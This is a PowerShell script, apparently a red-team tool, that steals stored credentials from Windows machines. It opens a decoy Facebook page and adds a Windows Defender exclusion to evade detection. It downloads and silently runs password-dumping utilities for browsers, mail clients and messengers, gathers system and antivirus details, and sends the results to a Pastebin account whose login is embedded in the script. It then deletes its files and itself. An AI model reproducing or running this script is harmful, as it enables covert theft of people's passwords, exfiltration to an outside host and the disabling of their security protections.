<#
.SYNOPSIS
   Dump major browsers stored credentials

   Author: @r00t-3xp10it (ssa redteam)
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: administrator privileges
   Optional Dependencies: WebBrowserPassView.exe | SendToPasteBin.ps1
   PS cmdlet Dev version: v1.2.8

.DESCRIPTION
   Este script adiciona uma exclusao (pasta TEMP) ao windows defender
   para poder executar commandos sem ser detectado. Depois faz o dump
   de credenciais armazenadas nos browsers e envia o logfile para o
   site www.pastebin.com/u/pedro_testing para revermos as capturas.

.NOTES
   Para aceder as credenciais leaked:
   1 - aceder a: https://pastebin.com/u/pedro_testing
   2 - username: pedro_testing
   3 - password: angelapastebin

   Browsers suportados: Chrome,Chromium,Firefox,MEdge,Safari.
   Remark: Este script foi escrito para a sua execuçao passar
   despercebida ao windows defender antivirus mas provalvelmente
   sera detectado se o alvo estiver outro antivirus instalado.

.Parameter PasteBinUserName
   PasteBin website username access (default: pedro_testing)

.Parameter PasteBinPassword
   PasteBin website password access (default: angelapastebin)

.Parameter URI
   Open URL on a new web browser tab (social engineering)

.Parameter AutoDelete
   Auto-Delete this cmdlet in the end (default: true)

.EXAMPLE
   Execute Confeitaria-SDA (execution visible)
   PS C:\> powershell -file Confeitaria-SDA.ps1
  
.EXAMPLE
   Execute Confeitaria-SDA (execution visible) and open a new web browser tab in URL
   PS C:\> powershell -file Confeitaria-SDA.ps1 -Uri "https://pastebin.com/u/pedro_testing"

.EXAMPLE
   Silent execute Confeitaria-SDA (background process)
   PS C:\> Start-Process -WindowStyle hidden powershell -ArgumentList "-file Confeitaria-SDA.ps1"

.INPUTS
   None. You cannot pipe objects into Confeitaria-SDA.ps1

.OUTPUTS
   [-] Running with admin creds ..
   [*] Creating defender exclusion ..
   [*] Dumping browsers credentials ..
   [*] Dumping mail serv credentials ..
   [*] Dumping messenger credentials ..
   [*] Sending credentials to pastebin ..

       pastebin  : https://pastebin.com/u/pedro_testing
       password  : angelapastebin
       username  : pedro_testing

   [*] Deleting defender exclusion ..
   [-] Finished at 06:16:00 [21/07/2023]
   
.LINK
   https://pastebin.com/u/pedro_testing
   https://m.facebook.com/people/Confeitaria-SDA/100063746270005
   https://gist.github.com/r00t-3xp10it/2818e17753aa9cf2b4a973c1277c5f9a
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$URI="https://www.facebook.com/events/create/?acontext=%7B`"event_action_history`"%3A[%7B`"mechanism`"%3A`"left_rail`"%2C`"surface`"%3A`"bookmark`"%7D]%2C`"ref_notif_type`"%3Anull%7D&dialog_entry_point=bookmark",
   [string]$PasteBinPassword="angelapastebin",
   [string]$PasteBinUserName="pedro_testing",
   [string]$AutoDelete="true"
)


write-host ""
$Ipath = (Get-Location).Path
$ErrorActionPreference = "SilentlyContinue"

## Open|Start a new web browser tab in
# $URI web page to fake a legit action
Start-Process "$URI" -WindowStyle Maximized

## Make sure shell is running with administrator privileges before continue
If([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544") -iNotMatch '^(True)$')
{
   write-host "[x] Administrator privileges required!`n" -ForegroundColor Red
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
   return
}


## Create %TMP% directory exclusion in windows Defender
write-host "[-] Running with admin creds .." -ForegroundColor Green
If((Get-MpComputerStatus).RealTimeProtectionEnabled -Match '^(True)$')
{

   <#
   .DESCRIPTION
      Esta funcçao cria uma exclusao no windows defender ( se a protecçao
      activa estiver a funcionar ) que aponta para a pasta TEMP permitindo-nos
      utilizar a pasta seleccionada para passar despercebido pelo windows defender.
   #>

   ## Make sure the exclusion does NOT already exist
   If((Get-MpPreference).ExclusionPath -NotMatch '(\\Temp)$')
   {
      If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference") -Match '^(True)$')
      {
         write-host "[*] Creating defender exclusion .." -ForegroundColor Green
         Set-MpPreference -ExclusionPath "C:\Users\$ENV:USERNAME\AppData\Local\Temp" -Force
         Start-Sleep -Milliseconds 4000 # Give extra time for rule to became 'active' ?
      }
   }
}


<#
.DESCRIPTION
   Esta funcçao faz o download de WebBrowserPassView.msc para
   a pasta TEMP e executa o programa dessa localizaçao para
   fazer o dump das credenciais da maioria dos browsers. o
   dump sera gravado num ficheiro txt [Confeitaria-SDA.txt]
#>

cd "$Env:TMP"
$LOGFILE = "${Env:TMP}\Confeitaria-SDA.txt"
$Current = (Get-Date -Format 'HH:mm:ss [dd/MM/yyyy]')
write-host "[*] Dumping browsers credentials .." -ForegroundColor Green
$CmdLine = "/Lo@adP@as@sw@or@dsI@E 1 /Lo@adPa@ss@wor@d@sFir@ef@ox 1 /Loa@dP@as@sw@or@ds@Ch@ro@m@e 1 /Lo@adPa@ss@wo@rd@sO@pe@ra 1 /Loa@dPa@ss@wo@rd@sS@af@ar@i 1" -replace '@',''
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/WebBrowserPassView.exe" -OutFile "$Env:TMP\Confeitaria-SDA.msc"|Unblock-File
Start-Process -WindowStyle Hidden powershell -ArgumentList ".\Confeitaria-SDA.msc $CmdLine /stext Confeitaria-SDA.txt" -Wait

## Dump mail services credentials
write-host "[*] Dumping mail serv credentials .." -ForegroundColor Green
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/mailpv.exe" -OutFile "$Env:TMP\mailpv.msc"|Unblock-File
Start-Process -WindowStyle Hidden powershell -ArgumentList ".\mailpv.msc /stext maildump.txt" -Wait

## Append outlook dump to logfile (mail serv)
$DumpMailServices = (Get-Content -Path "$Env:TMP\maildump.txt")
If(-not([string]::IsNullOrEmpty($DumpMailServices)))
{
   echo $DumpMailServices >> "$LOGFILE"
}

## Dump Instant Messenger credentials
write-host "[*] Dumping messenger credentials .." -ForegroundColor Green
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/mspass.exe" -OutFile "$Env:TMP\mspass.msc"|Unblock-File
Start-Process -WindowStyle Hidden powershell -ArgumentList ".\mspass.msc /stext mspass.txt" -Wait

## Append messenger dump to logfile (messenger serv)
$DumpMessengers = (Get-Content -Path "$Env:TMP\mspass.txt")
If(-not([string]::IsNullOrEmpty($DumpMessengers)))
{
   echo $DumpMessengers >> "$LOGFILE"
}


## Send-To-Pastebin function
$RAWLEAK = (Get-Content -Path "$LOGFILE")
If(-not([string]::IsNullOrEmpty($RAWLEAK)))
{

   <#
   .DESCRIPTION
      Esta funcçao pega no logfile criado pelo dump dos browsers
      e envia-o para o website www.pastebin.com\u\pedro_testing
   #>

   $WmiQuery = "SELECT * FROM AntiVirusProduct"
   ## Remake LOGFILE to append target system information
   echo "Computer: $((Get-WmiObject Win32_OperatingSystem).CSName)" > "$LOGFILE"
   echo "AntiVirus: $((Get-WmiObject -Namespace "root\SecurityCenter2" -Query $WmiQuery).displayName)" >> "$LOGFILE"
   echo "$((Get-WmiObject Win32_OperatingSystem).Caption) - $((Get-WmiObject Win32_OperatingSystem).OSArchitecture)" >> "$LOGFILE"
   echo "Dump browser credentials - $Current" >> "$LOGFILE"
   echo $RAWLEAK >> "$LOGFILE"

   write-host "[*] Sending credentials to pastebin .." -ForegroundColor Green
   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SendToPasteBin.ps1" -OutFile "$Env:TMP\SendToPasteBin.ps1"|Unblock-file
   Start-Process -WindowStyle hidden powershell -ArgumentList "-File $Env:TMP\SendToPasteBin.ps1 -PastebinUsername $PasteBinUserName -PastebinPassword $PasteBinPassword -FilePath $LOGFILE -MaxPastes 1 -TimeOut 1 -Egg true" -Wait

   write-host "`n    pastebin  : " -NoNewline
   write-host "https://pastebin.com/u/$PasteBinUserName" -ForegroundColor DarkYellow
   write-host "    password  : $PasteBinPassword"
   write-host "    username  : $PasteBinUserName`n"
}


cd "$Ipath"
## Final CmdLet CleanUp
Remove-Item -Path "${Env:TMP}\Confeitaria-SDA.txt" -Force
Remove-Item -Path "${Env:TMP}\Confeitaria-SDA.msc" -Force
Remove-Item -Path "${Env:TMP}\SendToPasteBin.ps1" -Force
Remove-Item -Path "${Env:TMP}\maildump.txt" -Force
Remove-Item -Path "${Env:TMP}\mailpv.msc" -Force
Remove-Item -Path "${Env:TMP}\mailpv.cfg" -Force
Remove-Item -Path "${Env:TMP}\mspass.cfg" -Force
Remove-Item -Path "${Env:TMP}\mspass.txt" -Force
Remove-Item -Path "${Env:TMP}\mspass.msc" -Force

Start-Sleep -Milliseconds 800
## Windows Defender Exclusion - CleanUp
If((Get-MpComputerStatus).RealTimeProtectionEnabled -Match '^(True)$')
{
   ## Make sure the exclusion exists
   If((Get-MpPreference).ExclusionPath -Match '(\\Temp)$')
   {
      If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference") -Match '^(True)$')
      {
         write-host "[*] Deleting defender exclusion .." -ForegroundColor Green
         Remove-MpPreference -ExclusionPath "C:\Users\$ENV:USERNAME\AppData\Local\Temp" -Force
      }
   }
}

write-host "[-] Finished at $(Get-Date -Format 'HH:mm:ss [dd/MM/yyyy]')`n" -ForegroundColor Green

If($AutoDelete -Match '^(true)$')
{
   ## Auto Delete this cmdlet in the end and change policy
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
}
exit